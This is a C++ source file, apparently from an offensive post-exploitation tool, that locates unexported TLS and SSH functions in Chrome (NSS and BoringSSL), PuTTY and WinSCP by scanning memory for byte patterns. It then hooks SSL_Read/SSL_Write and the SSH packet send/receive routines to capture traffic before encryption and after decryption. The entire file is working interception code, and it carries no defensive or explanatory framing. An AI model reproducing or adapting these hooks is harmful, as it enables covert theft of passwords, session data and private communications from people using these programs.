
#include "stdafx.h"
#include "NonExportedHooks.h"

// Chrome NSS

void HookChromeNSS()
{
	SECTION_INFO rdata = {0, 0};
	SECTION_INFO text  = {0, 0};

	// Specific binary data

	unsigned char SSL_string[] = {'S', 'S', 'L', 0x00, 'A', 'E', 'S'};  // SSL\0
	unsigned char PSH_string[] = {0x68, 0x00, 0x00, 0x00, 0x00};        // push SSL
	unsigned char MOV_string[] = {0x4, 0x0, 0x0, 0x0};                  // mov OFFSET, 4

	// Get sections

	rdata = Process::GetModuleSection("chrome.dll", ".rdata");
	text  = Process::GetModuleSection("chrome.dll", ".text");

	// Check if chrome

	if(rdata.dwSize == 0 || rdata.dwStartAddress == 0 || text.dwSize == 0 || text.dwStartAddress == 0)
	{
		DebugLog::Log("[ERROR] Cannot get Chrome sections!");
		return;
	}

	// Search memory

	DWORD pSSL = Process::SearchMemory((void *)rdata.dwStartAddress, rdata.dwSize, (void *)SSL_string, 7);

	if(pSSL == 0)
	{
		DebugLog::Log("[ERROR] Cannot get Chrome SSL string!");
		return;
	}

	memcpy(PSH_string + 1, &pSSL, 4);

	DWORD pPSH = Process::SearchMemory((void *)text.dwStartAddress, text.dwSize, (void *)PSH_string, 5);

	if(pPSH == 0)
	{
		DebugLog::Log("[ERROR] Cannot get Chrome PUSH string!");
		return;
	}

	DWORD pMOV = Process::SearchMemory((void *)pPSH, 5000, (void *)MOV_string, 4) - 4;

	if(pMOV == 0)
	{
		DebugLog::Log("[ERROR] Cannot get Chrome MOV string!");
		return;
	}

	// Get function addresses from structure

	DWORD dwStruct = *(DWORD *)pMOV;
	DWORD pfSSL_Read = *(DWORD *)(dwStruct + 0x8);
	DWORD pfSSL_Write = *(DWORD *)(dwStruct + 0xC);

	// Add hooks

	SSL_Read_Original = (SSL_Read_Typedef)pfSSL_Read;
	SSL_Write_Original = (SSL_Write_Typedef)pfSSL_Write;

	Hooker::AddHook((void *)pfSSL_Read, (void *)SSL_Read_Callback);
	Hooker::AddHook((void *)pfSSL_Write, (void *)SSL_Write_Callback);
}

// New version of Chrome - BoringSSL

void HookChromeBoring()
{
	SECTION_INFO rdata = {0, 0};
	SECTION_INFO text  = {0, 0};

	// Specific binary data

	unsigned char PSH_string[] = {0x68, 0x00, 0x00, 0x00, 0x00};        // push SSL_string
	unsigned char SSL_string[] = "c:\\b\\build\\slave\\win\\build\\src\\third_party\\boringssl\\src\\ssl\\ssl_lib.c";
	const unsigned int nBytesBeforeRead  = 17;
	const unsigned int nBytesBeforeWrite = 17;
	const unsigned int READ_IND  = 17;
	const unsigned int WRITE_IND = 15;
	
	// Get sections

	rdata = Process::GetModuleSection("chrome.dll", ".rdata");
	text  = Process::GetModuleSection("chrome.dll", ".text");

	// Check if chrome

	if(rdata.dwSize == 0 || rdata.dwStartAddress == 0 || text.dwSize == 0 || text.dwStartAddress == 0)
	{
		DebugLog::Log("[ERROR] Cannot get Chrome sections!");
		return;
	}

	// Search memory

	DWORD pSSL = Process::SearchMemory((void *)rdata.dwStartAddress, rdata.dwSize, (void *)SSL_string, 70);

	if(pSSL == 0)
	{
		DebugLog::Log("[ERROR] Cannot get Chrome SSL string!");
		return;
	}

	memcpy(PSH_string + 1, &pSSL, 4);

	DWORD pPSHRead  = Process::SearchMemoryByN((void *)text.dwStartAddress, text.dwSize, (void *)PSH_string, 5, READ_IND);
	DWORD pPSHWrite = Process::SearchMemoryByN((void *)text.dwStartAddress, text.dwSize, (void *)PSH_string, 5, WRITE_IND);

	// Remove "bytes before" to reach the function start

	pPSHRead  = pPSHRead - nBytesBeforeRead;
	pPSHWrite = pPSHWrite - nBytesBeforeWrite;

	// Add hooks

	SSL_Read_Original = (SSL_Read_Typedef)pPSHRead;
	SSL_Write_Original = (SSL_Write_Typedef)pPSHWrite;

	Hooker::AddHook((void *)pPSHRead, (void *)SSL_Read_Callback);
	Hooker::AddHook((void *)pPSHWrite, (void *)SSL_Write_Callback);
}

// Hook Putty - (c) PuttyRider - Adrian Furtuna

void HookPutty()
{
	SECTION_INFO text  = {0, 0};
	unsigned char SEND_string[] = {0x51, 0x53, 0x55, 0x56, 0x8b, 0x74, 0x24, 0x14, 0x57, 0x8b, 
		0x7c, 0x24, 0x20, 0x33, 0xed, 0x3b, 0xfd, 0x89, 0x6c, 0x24, 0x10 };
	unsigned char RECV_string[] = {0x56, 0xff, 0x74, 0x24, 0x14, 0x8b, 0x74, 0x24, 0x0c, 0xff, 
		0x74, 0x24, 0x14, 0x8d, 0x46, 0x60, 0x50, 0xe8};

	//Get .text section

	text  = Process::GetModuleSection("putty.exe", ".text");

	if(text.dwSize == 0 || text.dwStartAddress == 0)
	{
		DebugLog::Log("[ERROR] Cannot get Putty section!");
		return;
	}

	// Serach functions

	DWORD pSend = Process::SearchMemory((void *)text.dwStartAddress, text.dwSize, (void *)SEND_string, 21);
	DWORD pRecv = Process::SearchMemory((void *)text.dwStartAddress, text.dwSize, (void *)RECV_string, 18);

	if(pSend == 0 || pRecv == 0)
	{
		DebugLog::Log("[ERROR] Cannot get Putty functions!");
		return;
	}

	// Add hooks

	PuttySend_Original = (PuttySend_Typedef)pSend;
	PuttyRecv_Original = (PuttyRecv_Typedef)pRecv;

	Hooker::AddHook((void *)pSend, (void *)PuttySend_Callback);
	Hooker::AddHook((void *)pRecv, (void *)PuttyRecv_Callback);
}

// Hook WinSCP

void HookWinSCP()
{
	SECTION_INFO text  = {0, 0};
	unsigned char SEND_string[] = { 0x55, 0x8B, 0xEC, 0x8B, 0x55, 0x0C, 0x8B, 0x45, 0x08, 0x83, 0xB8, 0x2C, 0x01, 0x00, 0x00 };
	unsigned char RECV_string[] = { 0x55, 0x8B, 0xEC, 0x83, 0xC4, 0xE4, 0x53, 0x56, 0x57, 0x8B, 0x75, 0x10, 0x8B, 0x5D, 0x08 };

	//Get .text section

	text  = Process::GetModuleSection("winscp.exe", ".text");

	if(text.dwSize == 0 || text.dwStartAddress == 0)
	{
		DebugLog::Log("[ERROR] Cannot get WinSCP section!");
		return;
	}

	// Serach functions

	DWORD pSend = Process::SearchMemory((void *)text.dwStartAddress, text.dwSize, (void *)SEND_string, 15);
	DWORD pRecv = Process::SearchMemory((void *)text.dwStartAddress, text.dwSize, (void *)RECV_string, 15);

	if(pSend == 0 || pRecv == 0)
	{
		DebugLog::Log("[ERROR] Cannot get WinSCP functions!");
		return;
	}

	// Add hooks

	SSH_Pktsend_Original = (SSH_Pktsend_Typedef)pSend;
	SSH_Rdpkt_Original = (SSH_Rdpkt_Typedef)pRecv;

	Hooker::AddHook((void *)pSend, (void *)SSH_Pktsend_Callback);
	Hooker::AddHook((void *)pRecv, (void *)SSH_Rdpkt_Callback);
}
